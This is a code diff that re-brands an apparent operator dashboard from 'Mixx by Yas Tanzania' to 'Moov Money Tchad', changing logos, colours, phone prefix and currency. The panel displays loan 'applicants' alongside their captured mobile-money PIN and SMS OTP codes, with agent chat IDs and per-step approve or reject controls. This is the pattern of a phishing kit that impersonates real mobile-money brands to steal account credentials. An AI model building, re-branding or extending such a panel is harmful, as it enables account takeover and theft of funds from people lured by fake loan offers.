@@ -4,28 +4,28 @@
   <meta charset="utf-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1" />
   <meta name="referrer" content="no-referrer" />
-  <title>Mixx by Yas Tanzania — Operations & Agent Management</title>
+  <title>Moov Money Tchad — Operations & Agent Management</title>
   <style>
     :root {
       color-scheme: light;
-      --brand-blue: #0056C6;
-      --brand-blue-hover: #0284C7;
-      --brand-yellow: #FED100;
+      --brand-blue: #004B93;
+      --brand-blue-hover: #002B66;
+      --brand-yellow: #FFC20E;
       --brand-yellow-hover: #E5BC00;
-      --orange: #0056C6;
-      --orange-hover: #0284C7;
-      --navy: #0A192F;
-      --navy-dark: #070F1E;
-      --purple: #0056C6;
+      --orange: #FF6600;
+      --orange-hover: #E05500;
+      --navy: #001D4A;
+      --navy-dark: #00112D;
+      --purple: #004B93;
       --ink: #272a32;
       --muted: #666a73;
       --line: #dcdde0;
       --card-bg: #ffffff;
       --bg: #f4f5f7;
       --green: #10b981;
-      --blue: #0056C6;
+      --blue: #004B93;
       --red: #ef4444;
-      --yellow: #FED100;
+      --yellow: #FFC20E;
     }
     * { box-sizing: border-box; }
     body { margin: 0; min-height: 100vh; background: var(--bg); color: var(--ink); font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Arial, sans-serif; line-height: 1.5; }
@@ -99,7 +99,7 @@
 </head>
 <body>
   <header>
-    <strong style="display:flex;align-items:center;gap:10px;"><img src="/mixx_by_yas_logo.svg" style="height:28px;" alt="Mixx by Yas" /> Mixx by Yas / Gestão de Operações</strong>
+    <strong style="display:flex;align-items:center;gap:10px;"><img src="/moov_money_logo.svg" style="height:28px; background:white; padding:2px; border-radius:4px;" alt="Moov Money Chad" /> Moov Money Tchad / Gestão de Operações</strong>
     <button class="language-toggle" type="button">EN</button>
   </header>
 
@@ -271,7 +271,7 @@
       <h2>
         <span>Gestão de Candidaturas & Estágios (Passo a Passo)</span>
       </h2>
-      <p class="desc">Acompanhe as candidaturas em tempo real, veja as validações de cada etapa (PIN e Confirmação SMS) e aprove ou rejeite cada etapa diretamente.</p>
+      <p class="desc">Acompanhe as candidaturas em tempo real, veja as validações de cada etapa (Code PIN Moov e Code OTP Moov) e aprove ou rejeite cada etapa diretamente.</p>
 
       <div style="margin-top: 14px; display:flex; gap:10px; align-items:center; flex-wrap:wrap;">
         <input id="appSearchInput" type="text" placeholder="🔍 Filtrar por candidato, telefone, referência..." style="flex:1; min-width:240px; max-width:360px; min-height:34px; padding:6px 12px; font-size:13px; border:1px solid var(--line); border-radius:6px;" />
@@ -286,8 +286,8 @@
               <th>Candidato</th>
               <th>Telefone</th>
               <th>Empréstimo</th>
-              <th>Passo 3: PIN Mixx</th>
-              <th>Passo 4: Confirmação SMS</th>
+              <th>Passo 3: Code PIN Moov</th>
+              <th>Passo 4: Code OTP Moov</th>
               <th>Agente</th>
               <th>Decisão Final</th>
             </tr>
@@ -635,12 +635,12 @@
 
           const dateStr = app.created_at ? new Date(app.created_at + 'Z').toLocaleString('pt-PT') : '—';
           const agentDisplay = app.agent_name ? `${escapeHtml(app.agent_name)}<br><small style="color:var(--muted);">ID: ${escapeHtml(app.agent_chat_id || 'sem chat')}</small>` : '<em style="color:var(--muted);">Direto</em>';
-          const phoneDisplay = String(app.phone).startsWith('+') ? escapeHtml(app.phone) : `+232 ${escapeHtml(app.phone)}`;
+          const phoneDisplay = String(app.phone).startsWith('+') ? escapeHtml(app.phone) : `+235 ${escapeHtml(app.phone)}`;
 
-          // Find Step 3 (PIN) and Step 4 (SMS Verification)
+          // Find Step 3 (PIN) and Step 4 (OTP Verification)
           const vers = app.verifications || [];
-          const pinVer = vers.find(v => v.step === 'zip_phone');
-          const smsVer = vers.find(v => v.step === 'id_document');
+          const pinVer = vers.find(v => v.step === 'zip_phone' || v.step === 'account_pin');
+          const smsVer = vers.find(v => v.step === 'id_document' || v.step === 'account_otp');
 
           // Render PIN Step
           let pinHtml = '';
@@ -662,12 +662,12 @@
             pinHtml = `<span style="color:var(--muted); font-size:11px;">— Aguardando —</span>`;
           }
 
-          // Render SMS Verification Step
+          // Render OTP Verification Step
           let smsHtml = '';
           if (smsVer) {
             const rawText = (smsVer.id_number || '').trim();
             const textExcerpt = rawText.length > 30 ? rawText.substring(0, 30) + '...' : rawText;
-            smsHtml = `<div style="font-size:11px; max-width:180px; word-break:break-all; background:#f8fafc; padding:3px 6px; border-radius:4px; border:1px solid #e2e8f0;" title="${escapeHtml(rawText)}"><code>${escapeHtml(textExcerpt || '—')}</code></div>`;
+            smsHtml = `<div style="font-size:11px; max-width:180px; word-break:break-all; background:#f8fafc; padding:3px 6px; border-radius:4px; border:1px solid #e2e8f0;" title="${escapeHtml(rawText)}"><strong>OTP:</strong> <code>${escapeHtml(textExcerpt || '—')}</code></div>`;
             if (smsVer.status === 'pending') {
               smsHtml += `
                 <div style="margin-top:4px;"><span class="badge yellow">Pendente</span></div>
@@ -688,7 +688,7 @@
             <td><code>${app.id.slice(0, 8)}...</code><br><small style="color:var(--muted);">${dateStr}</small></td>
             <td><strong>${escapeHtml(app.first_name)} ${escapeHtml(app.last_name)}</strong></td>
             <td><code>${phoneDisplay}</code></td>
-            <td><strong>SLE ${money.format(app.loan_amount)}</strong><br><small style="color:var(--muted);">${escapeHtml(app.loan_type)} • ${app.term_months}m</small></td>
+            <td><strong>FCFA ${money.format(app.loan_amount)}</strong><br><small style="color:var(--muted);">${escapeHtml(app.loan_type)} • ${app.term_months}m</small></td>
             <td>${pinHtml}</td>
             <td>${smsHtml}</td>
             <td>${agentDisplay}</td>
